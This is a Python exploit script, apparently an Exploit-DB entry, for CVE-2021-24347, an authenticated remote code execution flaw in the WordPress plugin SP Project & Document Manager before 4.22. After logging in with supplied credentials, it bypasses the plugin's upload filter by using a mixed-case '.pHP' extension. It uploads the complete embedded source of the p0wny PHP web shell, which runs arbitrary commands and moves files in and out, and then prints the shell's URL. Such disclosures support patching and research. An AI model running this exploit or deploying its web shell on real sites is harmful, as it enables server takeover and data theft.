# Exploit Title: Wordpress Plugin SP Project & Document Manager 4.21 - Remote Code Execution (RCE) (Authenticated)
# Date 07.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://smartypantsplugins.com/
# Software Link: https://downloads.wordpress.org/plugin/sp-client-document-manager.4.21.zip
# Version: Before 4.22
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24347
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24347/README.md

'''
Description:
The SP Project & Document Manager WordPress plugin before 4.22 allows users to upload files, however,
the plugin attempts to prevent php and other similar files that could be executed on the server from being uploaded
by checking the file extension. It was discovered that php files could still be uploaded by
changing the file extension's case, for example, from "php" to "pHP".
'''


'''
Banner:
'''
banner = """
   ______     _______     ____   ___ ____  _      ____  _  _  _____ _  _ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || ||___ /| || |___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_ |_ \| || |_ / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _|__) |__   _/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_||____/   |_|/_/   

                * Wordpress Plugin SP Project & Document Manager < 4.22 - RCE (Authenticated)                                                        
                * @Hacker5preme

"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin SP Project & Document Manager < 4.22 - RCE (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')
print('[*] Starting Exploit:')
print('')

'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
auth_header = auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print('[+] Authentication successfull !')
else:
    print('[-] Authentication failed !')
    exit()


'''
Retrieve User ID from the widget:
'''
user_id_text = session.get('http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=sp-client-document-manager-fileview').text
search_string = "<form><select name='user_uid' id='user_uid' class=''>"
user_string = ">" + username
user_id_text = user_id_text[user_id_text.find(search_string):]
user_id_text = user_id_text[user_id_text.find(user_string) - 2: user_id_text.find(user_string)]
user_id = user_id_text.replace("'", '')


'''
Exploit:
'''
exploit_url = "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=sp-client-document-manager-fileview&id=' + user_id

# Header (Exploit):
Header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Referer": exploit_url,
    "Content-Type": "multipart/form-data; boundary=---------------------------37032792112149247252673711332",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

# Web Shell payload (p0wny shell): https://github.com/flozz/p0wny-shell
shell_payload = "-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"cdm_upload_file_field\"\r\n\r\na1b3bac1bc\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"_wp_http_referer\"\r\n\r\n/wordpress/wp-admin/admin.php?page=sp-client-document-manager-fileview&id=1\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"dlg-upload-name\"\r\n\r\nExploits\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"dlg-upload-file[]\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"dlg-upload-file[]\"; filename=\"shell.pHP\"\r\nContent-Type: application/x-php\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&\")\n                    .replace(/</g, \"<\")\n                    .replace(/>/g, \">\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"dlg-upload-notes\"\r\n\r\n\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"sp-cdm-community-upload\"\r\n\r\nUpload\r\n-----------------------------37032792112149247252673711332--\r\n"

# Exploit:
session.post(exploit_url, headers=header, data=shell_payload)
print('')
print('[+] Exploit done !')
print(' -> Webshell: http://' + target_ip + ':' + target_port + wp_path + 'wp-content/uploads/sp-client-document-manager/' + user_id + '/shell.php')
print('')
            
